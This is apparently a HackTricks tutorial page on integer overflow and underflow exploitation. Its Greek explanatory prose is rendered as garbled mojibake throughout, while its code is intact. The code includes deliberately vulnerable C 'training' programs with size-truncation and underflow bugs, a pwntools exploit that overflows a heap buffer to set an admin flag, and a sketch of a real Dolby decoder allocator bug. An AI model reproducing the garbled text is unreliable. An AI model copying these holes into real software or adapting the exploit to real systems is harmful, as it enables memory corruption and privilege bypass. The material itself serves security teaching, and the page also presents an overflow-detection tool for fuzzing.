# Integer Overflow

{{#include ../banners/hacktricks-training.md}}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

Î£Ï„Î¿Î½ Ï€Ï…ÏÎ®Î½Î± ÎµÎ½ÏŒÏ‚ **integer overflow** Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ Î¿ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼ÏŒÏ‚ Ï€Î¿Ï… ÎµÏ€Î¹Î²Î¬Î»Î»ÎµÎ¹ Ï„Î¿ **Î¼Î­Î³ÎµÎ¸Î¿Ï‚** Ï„Ï‰Î½ Ï„ÏÏ€Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ ÏƒÏ„Î¿Î½ Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Î· **ÎµÏÎ¼Î·Î½ÎµÎ¯Î±** Ï„Ï‰Î½ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.

Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î­Î½Î±Ï‚ **8-bit unsigned integer** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î¹Î¼Î­Ï‚ Î±Ï€ÏŒ **0 to 255**. Î‘Î½ Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÏ„Îµ Î½Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÏ„Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® 256 ÏƒÎµ Î­Î½Î±Î½ 8-bit unsigned integer, Î±Ï…Ï„Î® Î¸Î± ÎµÏ€Î±Î½Î­Î»Î¸ÎµÎ¹ ÏƒÏ„Î¿ 0 Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î¿Ï Ï„Î·Ï‚ Ï‡Ï‰ÏÎ·Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±Ï‚ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ·Ï‚. ÎŸÎ¼Î¿Î¯Ï‰Ï‚, Î³Î¹Î± Î­Î½Î±Î½ **16-bit unsigned integer**, Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÏÎ±Ï„Î®ÏƒÎµÎ¹ Ï„Î¹Î¼Î­Ï‚ Î±Ï€ÏŒ **0 to 65,535**, Ï„Î¿ Ï€ÏÏŒÏƒÎ¸ÎµÎ¼Î± 1 ÏƒÏ„Î·Î½ Ï„Î¹Î¼Î® 65,535 Î¸Î± ÎºÎ¬Î½ÎµÎ¹ Ï„Î·Î½ Ï„Î¹Î¼Î® Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î¿ 0.

Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î­Î½Î±Ï‚ **8-bit signed integer** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Î½Î±Ï€Î±ÏÎ±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î¹Î¼Î­Ï‚ Î±Ï€ÏŒ **-128 to 127**. Î‘Ï…Ï„ÏŒ ÏƒÏ…Î¼Î²Î±Î¯Î½ÎµÎ¹ ÎµÏ€ÎµÎ¹Î´Î® Î­Î½Î± bit Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î±Î½Î±Ï€Î±ÏÎ±ÏƒÏ„Î®ÏƒÎµÎ¹ Ï„Î¿ Ï€ÏÏŒÏƒÎ·Î¼Î¿ (Î¸ÎµÏ„Î¹ÎºÏŒ Î® Î±ÏÎ½Î·Ï„Î¹ÎºÏŒ), Î±Ï†Î®Î½Î¿Î½Ï„Î±Ï‚ 7 bits Î³Î¹Î± Î½Î± Î±Î½Î±Ï€Î±ÏÎ±ÏƒÏ„Î®ÏƒÎ¿Ï…Î½ Ï„Î¿ Î¼Î­Î³ÎµÎ¸Î¿Ï‚. ÎŸ Ï€Î¹Î¿ Î±ÏÎ½Î·Ï„Î¹ÎºÏŒÏ‚ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ Î±Î½Î±Ï€Î±ÏÎ¯ÏƒÏ„Î±Ï„Î±Î¹ Ï‰Ï‚ **-128** (binary `10000000`), ÎºÎ±Î¹ Î¿ Ï€Î¹Î¿ Î¸ÎµÏ„Î¹ÎºÏŒÏ‚ Î±ÏÎ¹Î¸Î¼ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ **127** (binary `01111111`).

ÎœÎ­Î³Î¹ÏƒÏ„ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚ Î³Î¹Î± ÎºÎ¿Î¹Î½Î¿ÏÏ‚ Ï„ÏÏ€Î¿Ï…Ï‚ Î±ÎºÎµÏÎ±Î¯Ï‰Î½:
| Î¤ÏÏ€Î¿Ï‚           | ÎœÎ­Î³ÎµÎ¸Î¿Ï‚ (bits) | Î•Î»Î¬Ï‡Î¹ÏƒÏ„Î· Î¤Î¹Î¼Î®          | ÎœÎ­Î³Î¹ÏƒÏ„Î· Î¤Î¹Î¼Î®          |
|----------------|-------------|--------------------|--------------------|
| int8_t         | 8           | -128               | 127                |
| uint8_t        | 8           | 0                  | 255                |
| int16_t        | 16          | -32,768            | 32,767             |
| uint16_t       | 16          | 0                  | 65,535            |
| int32_t        | 32          | -2,147,483,648 | 2,147,483,647      |
| uint32_t       | 32          | 0                  | 4,294,967,295      |
| int64_t        | 64          | -9,223,372,036,854,775,808 | 9,223,372,036,854,775,807 |
| uint64_t       | 64          | 0                  | 18,446,744,073,709,551,615 |

ÎˆÎ½Î± short Î¹ÏƒÎ¿Î´Ï…Î½Î±Î¼ÎµÎ¯ Î¼Îµ `int16_t` ÎºÎ±Î¹ Î­Î½Î± int Î¹ÏƒÎ¿Î´Ï…Î½Î±Î¼ÎµÎ¯ Î¼Îµ `int32_t` ÎºÎ±Î¹ Î­Î½Î± long Î¹ÏƒÎ¿Î´Ï…Î½Î±Î¼ÎµÎ¯ Î¼Îµ `int64_t` ÏƒÎµ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± 64bits.

### ÎœÎ­Î³Î¹ÏƒÏ„ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚

Î“Î¹Î± Ï€Î¹Î¸Î±Î½Î­Ï‚ **web vulnerabilities** ÎµÎ¯Î½Î±Î¹ Ï€Î¿Î»Ï Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Ï„Î¹Ï‚ Î¼Î­Î³Î¹ÏƒÏ„ÎµÏ‚ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½ÎµÏ‚ Ï„Î¹Î¼Î­Ï‚:

{{#tabs}}
{{#tab name="Rust"}}
```rust
fn main() {

let mut quantity = 2147483647;

let (mul_result, _) = i32::overflowing_mul(32767, quantity);
let (add_result, _) = i32::overflowing_add(1, quantity);

println!("{}", mul_result);
println!("{}", add_result);
}
```
{{#endtab}}

{{#tab name="C"}}
```c
#include <stdio.h>
#include <limits.h>

int main() {
int a = INT_MAX;
int b = 0;
int c = 0;

b = a * 100;
c = a + 1;

printf("%d\n", INT_MAX);
printf("%d\n", b);
printf("%d\n", c);
return 0;
}
```
{{#endtab}}
{{#endtabs}}

## Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±

### ÎšÎ±Î¸Î±ÏÏŒ overflow

Î¤Î¿ ÎµÎºÏ„Ï…Ï€Ï‰Î¼Î­Î½Î¿ Î±Ï€Î¿Ï„Î­Î»ÎµÏƒÎ¼Î± Î¸Î± ÎµÎ¯Î½Î±Î¹ 0 ÎºÎ±Î¸ÏÏ‚ Ï…Ï€ÎµÏÏ‡ÎµÎ¯Î»Î¹ÏƒÎ±Î¼Îµ Ï„Î¿ char:
```c
#include <stdio.h>

int main() {
unsigned char max = 255; // 8-bit unsigned integer
unsigned char result = max + 1;
printf("Result: %d\n", result); // Expected to overflow
return 0;
}
```
### ÎœÎµÏ„Î±Ï„ÏÎ¿Ï€Î® Î±Ï€ÏŒ signed ÏƒÎµ unsigned

Î£ÎºÎµÏ†Ï„ÎµÎ¯Ï„Îµ Î¼Î¹Î± Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· ÏŒÏ€Î¿Ï… Î­Î½Î±Ï‚ signed integer Î´Î¹Î±Î²Î¬Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ ÎµÎ¯ÏƒÎ¿Î´Î¿ Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ Î­Î½Î± Ï€Î»Î±Î¯ÏƒÎ¹Î¿ Ï€Î¿Ï… Ï„Î¿Î½ Î±Î½Ï„Î¹Î¼ÎµÏ„Ï‰Ï€Î¯Î¶ÎµÎ¹ Ï‰Ï‚ unsigned integer, Ï‡Ï‰ÏÎ¯Ï‚ ÏƒÏ‰ÏƒÏ„Î® ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·:
```c
#include <stdio.h>

int main() {
int userInput; // Signed integer
printf("Enter a number: ");
scanf("%d", &userInput);

// Treating the signed input as unsigned without validation
unsigned int processedInput = (unsigned int)userInput;

// A condition that might not work as intended if userInput is negative
if (processedInput > 1000) {
printf("Processed Input is large: %u\n", processedInput);
} else {
printf("Processed Input is within range: %u\n", processedInput);
}

return 0;
}
```
Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î­Î½Î±Î½ Î±ÏÎ½Î·Ï„Î¹ÎºÏŒ Î±ÏÎ¹Î¸Î¼ÏŒ, Î±Ï…Ï„ÏŒÏ‚ Î¸Î± ÎµÏÎ¼Î·Î½ÎµÏ…Ï„ÎµÎ¯ Ï‰Ï‚ Î¼ÎµÎ³Î¬Î»Î¿Ï‚ unsigned integer Î»ÏŒÎ³Ï‰ Ï„Î¿Ï… Ï„ÏÏŒÏ€Î¿Ï… Ï€Î¿Ï… ÎµÏÎ¼Î·Î½ÎµÏÎ¿Î½Ï„Î±Î¹ Î¿Î¹ Î´Ï…Î±Î´Î¹ÎºÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚, Î³ÎµÎ³Î¿Î½ÏŒÏ‚ Ï€Î¿Ï… ÎµÎ½Î´Î­Ï‡ÎµÏ„Î±Î¹ Î½Î± Î¿Î´Î·Î³Î®ÏƒÎµÎ¹ ÏƒÎµ Î±Ï€ÏÎ¿ÏƒÎ´ÏŒÎºÎ·Ï„Î· ÏƒÏ…Î¼Ï€ÎµÏÎ¹Ï†Î¿ÏÎ¬.

### macOS Overflow Example
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Realistic integer-overflow â†’ undersized allocation â†’ heap overflow â†’ flag
* Works on macOS arm64 (no ret2win required; avoids PAC/CFI).
*/

__attribute__((noinline))
void win(void) {
puts("ğŸ‰ EXPLOITATION SUCCESSFUL ğŸ‰");
puts("FLAG{integer_overflow_to_heap_overflow_on_macos_arm64}");
exit(0);
}

struct session {
int is_admin;           // Target to flip from 0 â†’ 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks to avoid EINVAL on large nbyte (macOS PTY/TTY)
const size_t MAX_CHUNK = 1 << 20; // 1 MiB per read (any sane cap is fine)
size_t got = 0;

printf("Requested bytes: %zu\n", want);

while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;

ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) {
got += (size_t)n;
continue;
}
if (n == 0) {
// EOF â€“ stop; partial reads are fine for our exploit
break;
}
// n < 0: real error (likely EINVAL when chunk too big on some FDs)
perror("read");
break;
}
return got;
}


int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Bundle Importer (training) ===");

// 1) Read attacker-controlled parameters (use large values)
size_t count = 0, elem_size = 0;
printf("Entry count: ");
if (scanf("%zu", &count) != 1) return 1;
printf("Entry size: ");
if (scanf("%zu", &elem_size) != 1) return 1;

// 2) Compute total bytes with a 32-bit truncation bug (vulnerability)
//    NOTE: 'product32' is 32-bit â†’ wraps; then we add a tiny header.
uint32_t product32 = (uint32_t)(count * elem_size);//<-- Integer overflow because the product is converted to 32-bit.
/* So if you send "4294967296" (0x1_00000000 as count) and 1 as element --> 0x1_00000000 * 1 = 0 in 32bits
Then, product32 = 0
*/
uint32_t alloc32   = product32 + 32; // alloc32 = 0 + 32 = 32
printf("[dbg] 32-bit alloc = %u bytes (wrapped)\n", alloc32);

// 3) Allocate a single arena and lay out [buffer][slack][session]
//    This makes adjacency deterministic (no reliance on system malloc order).
const size_t SLACK = 512;
size_t arena_sz = (size_t)alloc32 + SLACK; // 32 + 512 = 544 (0x220)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;  // In this buffer the attacker will copy data
struct session *sess = (struct session*)(arena + (size_t)alloc32 + 16); // The session is stored right after the buffer + alloc32 (32) + 16 = buffer + 48
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p alloc32=%u sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, alloc32, (void*)sess,
((size_t)alloc32 + 16)); // This just prints the address of the pointers to see that the distance between "buf" and "sess" is 48 (32 + 16).

// 4) Copy uses native size_t product (no truncation) â†’ It generates an overflow
size_t to_copy = count * elem_size;                   // <-- Large size_t
printf("[dbg] requested copy (size_t) = %zu\n", to_copy);

puts(">> Send bundle payload on stdin (EOF to finish)...");
size_t got = read_stdin(buf, to_copy); // <-- Heap overflow vulnerability that can bue abused to overwrite sess->is_admin to 1
printf("[dbg] actually read = %zu bytes\n", got);

// 5) Privileged action gated by a field next to the overflow target
if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_ovf_heap_priv int_ovf_heap_priv.c
```
#### Exploit
```python
# exploit.py
from pwn import *

# Keep logs readable; switch to "debug" if you want full I/O traces
context.log_level = "info"

EXE = "./int_ovf_heap_priv"

def main():
# IMPORTANT: use plain pipes, not PTY
io = process([EXE])  # stdin=PIPE, stdout=PIPE by default

# 1) Drive the prompts
io.sendlineafter(b"Entry count: ", b"4294967296")  # 2^32 -> (uint32_t)0
io.sendlineafter(b"Entry size: ",  b"1")           # alloc32 = 32, offset_to_sess = 48

# 2) Wait until itâ€™s actually reading the payload
io.recvuntil(b">> Send bundle payload on stdin (EOF to finish)...")

# 3) Overflow 48 bytes, then flip is_admin to 1 (little-endian)
payload = b"A" * 48 + p32(1)

# 4) Send payload, THEN send EOF via half-close on the pipe
io.send(payload)
io.shutdown("send")   # <-- this delivers EOF when using pipes, it's needed to stop the read loop from the binary

# 5) Read the rest (should print admin + FLAG)
print(io.recvall(timeout=5).decode(errors="ignore"))

if __name__ == "__main__":
main()
```
### Î Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± macOS Underflow
```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

/*
* Integer underflow -> undersized allocation + oversized copy -> heap overwrite
* Works on macOS arm64. Data-oriented exploit: flip sess->is_admin.
*/

__attribute__((noinline))
void win(void) {
puts("ğŸ‰ EXPLOITATION SUCCESSFUL ğŸ‰");
puts("FLAG{integer_underflow_heap_overwrite_on_macos_arm64}");
exit(0);
}

struct session {
int  is_admin;      // flip 0 -> 1
char note[64];
};

static size_t read_stdin(void *dst, size_t want) {
// Read in bounded chunks so huge 'want' doesn't break on PTY/TTY.
const size_t MAX_CHUNK = 1 << 20; // 1 MiB
size_t got = 0;
printf("[dbg] Requested bytes: %zu\n", want);
while (got < want) {
size_t remain = want - got;
size_t chunk  = remain > MAX_CHUNK ? MAX_CHUNK : remain;
ssize_t n = read(STDIN_FILENO, (char*)dst + got, chunk);
if (n > 0) { got += (size_t)n; continue; }
if (n == 0) break;    // EOF: partial read is fine
perror("read"); break;
}
return got;
}

int main(void) {
setvbuf(stdout, NULL, _IONBF, 0);
puts("=== Packet Importer (UNDERFLOW training) ===");

size_t total_len = 0;
printf("Total packet length: ");
if (scanf("%zu", &total_len) != 1) return 1; // Suppose it's "8"

const size_t HEADER = 16;

// **BUG**: size_t underflow if total_len < HEADER
size_t payload_len = total_len - HEADER;   // <-- UNDERFLOW HERE if total_len < HEADER --> Huge number as it's unsigned
// If total_len = 8, payload_len = 8 - 16 = -8 = 0xfffffffffffffff8 = 18446744073709551608 (on 64bits - huge number)
printf("[dbg] total_len=%zu, HEADER=%zu, payload_len=%zu\n",
total_len, HEADER, payload_len);

// Build a deterministic arena: [buf of total_len][16 gap][session][slack]
const size_t SLACK = 256;
size_t arena_sz = total_len + 16 + sizeof(struct session) + SLACK; // 8 + 16 + 72 + 256 = 352 (0x160)
unsigned char *arena = (unsigned char*)malloc(arena_sz);
if (!arena) { perror("malloc"); return 1; }
memset(arena, 0, arena_sz);

unsigned char *buf  = arena;
struct session *sess = (struct session*)(arena + total_len + 16);
// The offset between buf and sess is total_len + 16 = 8 + 16 = 24 (0x18)
sess->is_admin = 0;
strncpy(sess->note, "regular user", sizeof(sess->note)-1);

printf("[dbg] arena=%p buf=%p total_len=%zu sess=%p offset_to_sess=%zu\n",
(void*)arena, (void*)buf, total_len, (void*)sess, total_len + 16);

puts(">> Send payload bytes (EOF to finish)...");
size_t got = read_stdin(buf, payload_len);
// The offset between buf and sess is 24 and the payload_len is huge so we can overwrite sess->is_admin to set it as 1
printf("[dbg] actually read = %zu bytes\n", got);

if (sess->is_admin) {
puts("[dbg] admin privileges detected");
win();
} else {
puts("[dbg] normal user");
}
return 0;
}
```
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï„Î¿ Î¼Îµ:
```bash
clang -O0 -Wall -Wextra -std=c11 -D_FORTIFY_SOURCE=0 \
-o int_underflow_heap int_underflow_heap.c
```
### Allocator alignment rounding wrap â†’ undersized chunk â†’ heap overflow (Dolby UDC case)

ÎŸÏÎ¹ÏƒÎ¼Î­Î½Î¿Î¹ custom allocators ÏƒÏ„ÏÎ¿Î³Î³Ï…Î»Î¿Ï€Î¿Î¹Î¿ÏÎ½ Ï„Î¹Ï‚ allocations Ï€ÏÎ¿Ï‚ Ï„Î± ÎµÏ€Î¬Î½Ï‰ ÏƒÏ„Î¿ alignment Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± ÎµÏ€Î±Î½ÎµÎ»Î­Î³Ï‡Î¿Ï…Î½ Î³Î¹Î± overflow. Î£Ï„Î¿Î½ Dolby Unified Decoder (Pixel 9, CVE-2025-54957), Ï„Î¿ attacker-controlled `emdf_payload_size` (decoded Î¼Îµ Î­Î½Î±Î½ unbounded `variable_bits(8)` Î²ÏÏŒÏ‡Î¿) Ï„ÏÎ¿Ï†Î¿Î´Î¿Ï„ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î· `ddp_udc_int_evo_malloc`:
```c
size_t total_size = alloc_size + extra;
if (alloc_size + extra < alloc_size) return 0; // initial wrap guard
if (total_size % 8)
total_size += (8 - total_size) % total_size; // vulnerable rounding
if (total_size > heap->remaining) return 0;
```
Î“Î¹Î± Ï„Î¹Î¼Î­Ï‚ 64-bit ÎºÎ¿Î½Ï„Î¬ ÏƒÏ„Î¿ `0xFFFFFFFFFFFFFFF9`, Î· Î­ÎºÏ†ÏÎ±ÏƒÎ· `(8 - total_size) % total_size` Ï„Ï…Î»Î¯Î³ÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÏƒÎ¸ÎµÏƒÎ· ÎºÎ±Î¹ Ï€Î±ÏÎ¬Î³ÎµÎ¹ Î­Î½Î± **Î¼Î¹ÎºÏÎ¿ÏƒÎºÎ¿Ï€Î¹ÎºÏŒ `total_size`** Ï€Î±ÏÏŒÎ»Î¿ Ï€Î¿Ï… Ï„Î¿ Î»Î¿Î³Î¹ÎºÏŒ `alloc_size` Ï€Î±ÏÎ±Î¼Î­Î½ÎµÎ¹ Ï„ÎµÏÎ¬ÏƒÏ„Î¹Î¿. ÎŸ ÎºÎ±Î»ÏÎ½ Î±ÏÎ³ÏŒÏ„ÎµÏÎ± Î³ÏÎ¬Ï†ÎµÎ¹ `payload_length` bytes ÏƒÏ„Î¿ ÎµÏ€Î¹ÏƒÏ„ÏÎµÏ†ÏŒÎ¼ÎµÎ½Î¿ chunk:
```c
buffer = ddp_udc_int_evo_malloc(evo_heap, payload_length, extra);
for (size_t i = 0; i < payload_length; i++) { // bounds use logical size
buffer[i] = next_byte_from_emdf();       // writes past tiny chunk
}
```
Î“Î¹Î±Ï„Î¯ Î· ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· ÎµÎ¯Î½Î±Î¹ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î· ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î¼Î¿Ï„Î¯Î²Î¿:
- **Overflow length control:** Î¤Î± bytes Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î±Î½ reader Ï€Î¿Ï… Ï€ÎµÏÎ¹Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± Î¬Î»Î»Î¿ attacker-chosen Î¼Î®ÎºÎ¿Ï‚ (`emdf_container_length`), Î­Ï„ÏƒÎ¹ Ï„Î¿ write ÏƒÏ„Î±Î¼Î±Ï„Î¬ Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ N bytes Î±Î½Ï„Î¯ Î½Î± ÏˆÎµÎºÎ¬Î¶ÎµÎ¹ `payload_length`.
- **Overflow data control:** Î¤Î± bytes Ï€Î¿Ï… Î³ÏÎ¬Ï†Î¿Î½Ï„Î±Î¹ Ï€Î­ÏÎ± Î±Ï€ÏŒ Ï„Î¿ chunk ÎµÎ¯Î½Î±Î¹ Ï€Î»Î®ÏÏ‰Ï‚ attacker-supplied Î±Ï€ÏŒ Ï„Î¿ EMDF payload.
- **Heap determinism:** ÎŸ allocator ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ per-frame bump-pointer slab Ï‡Ï‰ÏÎ¯Ï‚ frees, Î¿Ï€ÏŒÏ„Îµ Î· Î³ÎµÎ¹Ï„Î½Î¯Î±ÏƒÎ· Ï„Ï‰Î½ corrupted objects ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿Î²Î»Î­ÏˆÎ¹Î¼Î·.

## Î†Î»Î»Î± Î Î±ÏÎ±Î´ÎµÎ¯Î³Î¼Î±Ï„Î±

- [https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/int_overflow_post/index.html)
- Only 1B is used to store the size of the password so it's possible to overflow it and make it think it's length of 4 while it actually is 260 to bypass the length check protection
- [https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html](https://guyinatuxedo.github.io/35-integer_exploitation/puzzle/index.html)

- Given a couple of numbers find out using z3 a new number that multiplied by the first one will give the second one:

```
(((argv[1] * 0x1064deadbeef4601) & 0xffffffffffffffff) == 0xD1038D2E07B42569)
```

- [https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-8-exploiting-an-integer-overflow-vulnerability/)
- Only 1B is used to store the size of the password so it's possible to overflow it and make it think it's length of 4 while it actually is 260 to bypass the length check protection and overwrite in the stack the next local variable and bypass both protections

## Î‘Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ· integer overflow ÏƒÎµ Go Î¼Îµ go-panikint

Î¤Î¿ Go ÎºÎ¬Î½ÎµÎ¹ wrap ÏƒÏ„Î¿Ï…Ï‚ integers ÏƒÎ¹Ï‰Ï€Î·Î»Î¬. [go-panikint](https://github.com/trailofbits/go-panikint) ÎµÎ¯Î½Î±Î¹ Î­Î½Î± forked Go toolchain Ï€Î¿Ï… ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ SSA overflow checks Î­Ï„ÏƒÎ¹ ÏÏƒÏ„Îµ Î· wrapped arithmetic Î½Î± ÎºÎ±Î»ÎµÎ¯ Î±Î¼Î­ÏƒÏ‰Ï‚ `runtime.panicoverflow()` (panic + stack trace).

**Î“Î¹Î±Ï„Î¯ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ**

- ÎšÎ¬Î½ÎµÎ¹ overflow/truncation Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± ÏƒÏ„Î¿ fuzzing/CI ÎµÏ€ÎµÎ¹Î´Î® Î¿Î¹ wrapped Î±ÏÎ¹Î¸Î¼Î·Ï„Î¹ÎºÎ­Ï‚ Ï€ÏÎ¬Î¾ÎµÎ¹Ï‚ Ï„ÏÏÎ± Ï€ÏÎ¿ÎºÎ±Î»Î¿ÏÎ½ crash.
- Î§ÏÎ®ÏƒÎ¹Î¼Î¿ ÏƒÎµ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ user-controlled pagination, offsets, quotas, Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÎ¼ÏÎ½ Î¼ÎµÎ³Î­Î¸Î¿Ï…Ï‚ Î® access-control math (Ï€.Ï‡., `end := offset + limit` ÏƒÎµ `uint64` Ï€Î¿Ï… wrapÎ±ÏÎµÎ¹ ÏƒÎµ Î¼Î¹ÎºÏÎ­Ï‚ Ï„Î¹Î¼Î­Ï‚).

**ÎšÎ±Ï„Î±ÏƒÎºÎµÏ…Î® & Ï‡ÏÎ®ÏƒÎ·**
```bash
git clone https://github.com/trailofbits/go-panikint
cd go-panikint/src && ./make.bash
export GOROOT=/path/to/go-panikint
./bin/go test -fuzz=FuzzOverflowHarness
```
Î¤ÏÎ­Î¾Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ forked `go` binary Î³Î¹Î± tests/fuzzing ÏÏƒÏ„Îµ Î½Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Î½Ï„Î±Î¹ Ï„Î± overflow Ï‰Ï‚ panics.

**ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚ Î¸Î¿ÏÏÎ²Î¿Ï…**

- ÎŸÎ¹ Î­Î»ÎµÎ³Ï‡Î¿Î¹ truncation (casts ÏƒÎµ Î¼Î¹ÎºÏÏŒÏ„ÎµÏÎ± ints) Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÎºÎ±Î»Î¿ÏÎ½ Î¸ÏŒÏÏ…Î²Î¿.
- ÎšÎ±Ï„Î±ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Ï„Î± ÏƒÎºÏŒÏ€Î¹Î¼Î± wrap-around Î¼Î­ÏƒÏ‰ Ï†Î¯Î»Ï„ÏÏ‰Î½ source-path Î® inline `// overflow_false_positive` / `// truncation_false_positive` ÏƒÏ‡Î¿Î»Î¯Ï‰Î½.

**Î ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒ Î¼Î¿Ï„Î¯Î²Î¿**

go-panikint Î±Ï€Î¿ÎºÎ¬Î»Ï…ÏˆÎµ Î­Î½Î± Cosmos SDK `uint64` pagination overflow: `end := pageRequest.Offset + pageRequest.Limit` Î­ÎºÎ±Î½Îµ wrap Ï€Î­ÏÎ± Î±Ï€ÏŒ `MaxUint64`, ÎµÏ€Î¹ÏƒÏ„ÏÎ­Ï†Î¿Î½Ï„Î±Ï‚ ÎºÎµÎ½Î¬ Î±Ï€Î¿Ï„ÎµÎ»Î­ÏƒÎ¼Î±Ï„Î±. Î— instrumentation Î¼ÎµÏ„Î­Ï„ÏÎµÏˆÎµ Ï„Î¿ ÏƒÎ¹Ï‰Ï€Î·Î»ÏŒ wrap ÏƒÎµ panic Ï€Î¿Ï… Î¿Î¹ fuzzers Î¼Ï€ÏŒÏÎµÏƒÎ±Î½ Î½Î± ÎµÎ»Î±Ï‡Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½.

## ARM64

